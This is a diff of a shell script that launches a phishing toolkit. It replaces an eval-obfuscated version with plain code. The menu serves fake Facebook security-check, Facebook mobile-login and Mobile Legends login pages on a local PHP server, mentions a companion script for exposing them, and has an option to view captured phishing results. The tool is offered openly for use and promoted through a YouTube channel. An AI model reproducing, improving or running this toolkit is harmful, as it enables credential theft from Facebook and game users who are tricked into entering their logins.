@@ -1,3 +1,99 @@
-z="
-";mBz='ang ';az='ah';sBz='?" $';FCz='_"';XDz='ruby';GFz=' $i ';JDz='upda';kEz='MOBI';LBz='on2 ';DDz='if [';qDz='p 3';rDz='sh r';iCz='6"$m';uz='echo';yz='J4CK';lz='f fu';EDz=' $pi';gEz='ebp/';eEz='0 -t';bDz='gem ';SDz='apt ';TFz='MY C';LEz='alan';yDz='b...';jz='toil';QCz='DED"';xDz='t be';WEz='RITY';gDz='auto';sCz='r"ro';Kz='32;1';BBz='"sub';SCz=' CEK';QFz=' "SU';TBz='ISIN';cEz='host';Tz='cy='\''';tEz='ML';pDz='l"';ODz='get ';MBz='pw.p';Az='clea';nEz='V2';xBz=' new';dBz='Wira';hCz='ATE"';lBz=' sed';LFz='naka';ABz='OP"';uCz='ser"';KBz='pyth';uBz=']" $';vCz='$me"';SFz='IBE ';tCz='ot@u';lDz=' sud';UEz='OOK ';tBz='pur"';mz='ture';mEz='OGIN';MEz='kan ';vDz='2 ]';DEz='"buk';HBz='r J4';NFz='ols ';kDz='ules';iEz='3 ]';qBz='"[" ';tz='lcat';BEz='p 1.';REz='HISI';Iz='i='\''\';Rz=' #pu';CEz='5';UDz='he2';TDz='apac';HEz='n se';GDz='1 ]';FEz='w se';sEz='GEND';fz='ku='\''';DCz=' gas';BCz='Jala';WCz='3"$m';Yz='[31;';ACz='sion';GCz='"["$';EFz='.sh';rEz='E LE';Gz='#bir';RDz='bash';wCz=']"';lEz='LE L';OBz=' $bi';LDz='upgr';KCz=' INS';ZBz='0LS';gCz=' UPD';oz='b ph';Uz='[36;';Hz='u';BDz=' " p';cDz='lolc';Oz=''\''\03';RBz=' "WE';dCz='LEGE';VCz='N FB';XEz=' CHE';hEz='V1';yCz=' -p"';rCz='"$pu';eDz='open';MDz='ade';CDz='il';ZDz='let ';jCz=' HAS';KEz='an j';Dz='\033';nz=' "We';AEz='....';cCz='ILE ';UCz='MANA';NDz='apt-';nCz='0"$m';aDz='et';DBz='be y';IEz='kara';KDz='te';RCz='2"$m';CCz='nkan';wEz='pull';aEz='-S l';pEz='NG M';HCz='1"$m';bz='pu='\''';sz='| lo';yEz='cd ~';jBz='" se';EEz='a ne';nBz='star';TEz='ACEB';ICz='e"]"';HDz='then';OCz='ULES';PFz='p 2';BFz='p';bBz=' : A';WFz='ww.y';IBz='CKOP';FDz='l = ';IFz='anks';WDz='on2';OFz='Ini"';VFz='EL w';vEz='git ';CFz='sh h';fEz=' ~/W';EBz='outu';QEz='"  P';Cz='bi='\''';eCz='NDS"';UFz='HANN';AFz='/Web';rz='ee" ';Ez='[34;';wz='"aut';NCz=' MOD';FBz='be.c';xEz='6 ]';FFz='0 ]';wDz='"Wai';MFz='n To';KFz='h Gu';vz=' $me';jDz=' mod';Zz='#mer';qCz='"╭─[';RFz='BSCR';pz='isin';Qz=';1m'\''';ADz='╰─>>';UBz='G"';SBz='B PH';nDz='erin';iDz='"all';NBz='y';pBz=':"';lCz='HISH';VDz='nano';ZEz='php ';XCz=' LOG';tDz='h';jEz='__"';kBz='rver';ECz='.sh"';dDz='at';LCz='TALL';Xz='me='\''';oBz='ted ';hBz='p 1';eBz='hadi';xCz='read';hDz='php';PCz=' NEE';Pz='3[35';sDz='un.s';iz='ing';TCz=' KEA';bCz=' MOB';XBz='4CKO';fCz='5"$m';dz='#put';DFz='asil';PEz='___"';vBz='ku" ';Jz='033[';oDz='stal';gz='[33;';VEz='SECU';PBz='"___';yBz=' ses';Fz='1m'\'' ';Mz='ijo';Bz='r';rBz='$ku"';oEz='4 ]';pCz='T"';kz='et -';QDz='all ';Lz='m'\'' #';PDz='inst';hz='#kun';Nz='pur=';YEz='CK  ';iBz=' $pu';NEz='gas.';ez='ih';cz='[37;';oCz=' EXI';WBz='et J';YBz='P T0';Sz='rple';GBz='om/M';wBz='Buka';mDz='ah t';QBz='____';CBz='scri';mCz='ING"';OEz='sh"';MCz=' ALL';gBz='slee';bEz='ocal';aBz=' "Fb';JFz=' Uda';uDz='fi';uEz='5 ]';SEz='NG F';aCz='4"$m';Vz='#cya';qEz='OBIL';VBz='figl';qz='g fr';xz='hor ';Wz='n';cBz='zis ';ZCz='B"';dEz=':808';JEz='ng d';IDz='pkg ';XFz='exit';HFz=' "Th';JCz='$pu"';kCz='IL P';fDz='ssh';fBz=' "';GEz='ssio';YCz='IN F';JBz='"';YDz=' toi';
-eval "$Az$Bz$z$Cz$Dz$Ez$Fz$Gz$Hz$z$Iz$Jz$Kz$Lz$Mz$z$Nz$Oz$Pz$Qz$Rz$Sz$z$Tz$Dz$Uz$Fz$Vz$Wz$z$Xz$Dz$Yz$Fz$Zz$az$z$bz$Dz$cz$Fz$dz$ez$z$fz$Dz$gz$Fz$hz$iz$z$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$z$uz$vz$wz$xz$yz$ABz$z$uz$vz$BBz$CBz$DBz$EBz$FBz$GBz$HBz$IBz$JBz$z$KBz$LBz$MBz$NBz$z$Az$Bz$z$uz$OBz$PBz$QBz$QBz$QBz$QBz$QBz$QBz$QBz$QBz$QBz$JBz$z$jz$kz$lz$mz$RBz$SBz$TBz$UBz$z$VBz$WBz$XBz$YBz$ZBz$z$jz$kz$lz$mz$aBz$bBz$cBz$dBz$eBz$fBz$z$uz$OBz$PBz$QBz$QBz$QBz$QBz$QBz$QBz$QBz$QBz$QBz$JBz$z$gBz$hBz$z$uz$z$uz$iBz$jBz$kBz$lBz$mBz$nBz$oBz$pBz$z$uz$vz$qBz$rBz$sBz$tBz$uBz$vBz$wBz$xBz$yBz$ACz$JBz$z$uz$vz$qBz$rBz$sBz$tBz$uBz$vBz$BCz$CCz$DCz$ECz$z$uz$OBz$PBz$QBz$QBz$QBz$QBz$QBz$QBz$QBz$QBz$FCz$z$uz$vz$GCz$tBz$HCz$ICz$JCz$KCz$LCz$MCz$NCz$OCz$PCz$QCz$z$uz$vz$GCz$tBz$RCz$ICz$JCz$SCz$TCz$UCz$VCz$JBz$z$uz$vz$GCz$tBz$WCz$ICz$JCz$XCz$YCz$ZCz$z$uz$vz$GCz$tBz$aCz$ICz$JCz$bCz$cCz$dCz$eCz$z$uz$vz$GCz$tBz$fCz$ICz$JCz$gCz$hCz$z$uz$vz$GCz$tBz$iCz$ICz$JCz$SCz$jCz$kCz$lCz$mCz$z$uz$vz$GCz$tBz$nCz$ICz$JCz$oCz$pCz$z$uz$vz$PBz$QBz$QBz$QBz$QBz$QBz$QBz$QBz$QBz$FCz$z$uz$vz$qCz$rCz$sCz$tCz$uCz$vCz$wCz$z$xCz$yCz$ADz$BDz$CDz$z$DDz$EDz$FDz$GDz$z$HDz$z$IDz$JDz$KDz$z$IDz$LDz$MDz$z$NDz$ODz$PDz$QDz$RDz$z$SDz$PDz$QDz$TDz$UDz$z$IDz$PDz$QDz$VDz$z$IDz$PDz$QDz$KBz$WDz$z$IDz$PDz$QDz$XDz$YDz$ZDz$VBz$aDz$z$bDz$PDz$QDz$cDz$dDz$z$SDz$PDz$QDz$eDz$fDz$z$SDz$PDz$QDz$gDz$fDz$z$IDz$PDz$QDz$hDz$z$uz$iBz$iDz$jDz$kDz$lDz$mDz$nDz$oDz$pDz$z$gBz$qDz$z$rDz$sDz$tDz$z$uDz$z$DDz$EDz$FDz$vDz$z$HDz$z$uz$iBz$wDz$xDz$yDz$AEz$JBz$z$gBz$BEz$CEz$z$uz$iBz$DEz$EEz$FEz$GEz$HEz$IEz$JEz$KEz$LEz$MEz$NEz$OEz$z$uz$vz$PBz$QBz$QBz$QBz$QBz$QBz$QBz$QBz$PEz$z$gBz$BEz$CEz$z$uz$iBz$QEz$REz$SEz$TEz$UEz$VEz$WEz$XEz$YEz$JBz$z$ZEz$aEz$bEz$cEz$dEz$eEz$fEz$gEz$hEz$z$uDz$z$DDz$EDz$FDz$iEz$z$HDz$z$uz$iBz$wDz$xDz$yDz$AEz$JBz$z$gBz$hBz$z$uz$iBz$DEz$EEz$FEz$GEz$HEz$IEz$JEz$KEz$LEz$MEz$NEz$OEz$z$uz$vz$PBz$QBz$QBz$QBz$QBz$QBz$QBz$QBz$jEz$z$uz$iBz$QEz$REz$SEz$TEz$UEz$kEz$lEz$mEz$JBz$z$ZEz$aEz$bEz$cEz$dEz$eEz$fEz$gEz$nEz$z$uDz$z$DDz$EDz$FDz$oEz$z$HDz$z$uz$iBz$wDz$xDz$yDz$AEz$JBz$z$gBz$hBz$z$uz$iBz$DEz$EEz$FEz$GEz$HEz$IEz$JEz$KEz$LEz$MEz$NEz$OEz$z$uz$vz$PBz$QBz$QBz$QBz$QBz$QBz$QBz$QBz$jEz$z$uz$iBz$QEz$REz$pEz$qEz$rEz$sEz$JBz$z$ZEz$aEz$bEz$cEz$dEz$eEz$fEz$gEz$tEz$z$uDz$z$DDz$EDz$FDz$uEz$z$HDz$z$vEz$wEz$z$uDz$z$DDz$EDz$FDz$xEz$z$HDz$z$yEz$AFz$BFz$z$CFz$DFz$EFz$z$uDz$z$DDz$EDz$FDz$FFz$z$HDz$z$uz$z$uz$z$uz$GFz$HFz$IFz$JFz$KFz$LFz$MFz$NFz$OFz$z$gBz$PFz$z$uz$vz$QFz$RFz$SFz$TFz$UFz$VFz$WFz$EBz$FBz$GBz$HBz$IBz$JBz$z$uz$z$gBz$hBz$z$XFz$z$uDz"
+clear
+bi='\033[34;1m' #biru
+i='\033[32;1m' #ijo
+pur='\033[35;1m' #purple
+cy='\033[36;1m' #cyan
+me='\033[31;1m' #merah
+pu='\033[37;1m' #putih
+ku='\033[33;1m' #kuning
+
+toilet -f future "Web phising free" | lolcat
+echo $me"author J4CKOP"
+echo $me"subscribe youtube.com/Mr J4CKOP"
+
+python2 pw.py
+clear
+
+echo $bi"_______________________________________"
+toilet -f future "WEB PHISING"
+figlet J4CKOP T00LS
+toilet -f future "Fb : Azis Wirahadi "
+echo $bi"_______________________________________"
+sleep 1
+echo
+echo $pu" server sedang started :"
+echo $me"[" $ku"?" $pur"]" $ku" Buka new session"
+echo $me"[" $ku"?" $pur"]" $ku" Jalankan gas.sh"
+echo $bi"____________________________________"
+echo $me"["$pur"1"$me"]"$pu" INSTALL ALL MODULES NEEDED"
+echo $me"["$pur"2"$me"]"$pu" CEK KEAMANAN FB"
+echo $me"["$pur"3"$me"]"$pu" LOGIN FB"
+echo $me"["$pur"4"$me"]"$pu" MOBILE LEGENDS"
+echo $me"["$pur"5"$me"]"$pu" UPDATE"
+echo $me"["$pur"6"$me"]"$pu" CEK HASIL PHISHING"
+echo $me"["$pur"0"$me"]"$pu" EXIT"
+echo $me"____________________________________"
+echo $me"╭─["$pur"root@user"$me"]"
+read -p"╰─>> " pil
+
+if [ $pil = 1 ]; then
+    pkg update
+    pkg upgrade
+    apt-get install bash
+    apt install apache2
+    pkg install nano
+    pkg install python2
+    pkg install ruby toilet figlet
+    gem install lolcat
+    apt install openssh
+    apt install autossh
+    pkg install php
+    echo $pu"all modules sudah terinstall"
+    sleep 3
+    sh run.sh
+fi
+
+if [ $pil = 2 ]; then
+    echo $pu"Wait beb......."
+    sleep 1.5
+    echo $pu"buka new session sekarang dan jalankan gas.sh"
+    echo $me"__________________________________"
+    sleep 1.5
+    echo $pu"  PHISING FACEBOOK SECURITY CHECK  "
+    php -S localhost:8080 -t ~/Webp/V1
+fi
+
+if [ $pil = 3 ]; then
+    echo $pu"Wait beb......."
+    sleep 1
+    echo $pu"buka new session sekarang dan jalankan gas.sh"
+    echo $me"_________________________________"
+    echo $pu"  PHISING FACEBOOK MOBILE LOGIN"
+    php -S localhost:8080 -t ~/Webp/V2
+fi
+
+if [ $pil = 4 ]; then
+    echo $pu"Wait beb......."
+    sleep 1
+    echo $pu"buka new session sekarang dan jalankan gas.sh"
+    echo $me"_________________________________"
+    echo $pu"  PHISING MOBILE LEGEND"
+    php -S localhost:8080 -t ~/Webp/ML
+fi
+
+if [ $pil = 5 ]; then
+    git pull
+fi
+
+if [ $pil = 6 ]; then
+    cd ~/Webp
+    sh hasil.sh
+fi
+
+if [ $pil = 0 ]; then
+    echo $i"\n\nThanks Udah Gunakan Tools Ini"
+    sleep 2
+    echo $me"SUBSCRIBE MY CHANNEL www.youtube.com/Mr J4CKOP\n\n"
+    sleep 1
+    exit
+fi
